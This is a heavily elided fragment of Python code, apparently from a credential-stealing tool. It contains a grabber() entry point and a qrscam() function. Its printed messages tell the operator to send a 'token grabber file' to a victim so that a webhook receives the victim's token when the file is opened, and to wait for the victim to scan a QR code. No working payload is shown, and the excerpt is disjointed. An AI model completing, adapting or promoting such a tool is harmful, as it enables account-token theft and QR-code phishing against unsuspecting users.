...
if __name__ == '__main__':
    grabber()
            ...
            print(
                f'{Fore.LIGHTMAGENTA_EX}Now close Bang... And send token grabber file to victim, if victim open it webhook will send his token.')
        ...
        if coc == 2:
            ...
            def qrscam():
                ...
                print('Dont Bang, wait for the victim scan the QR code')
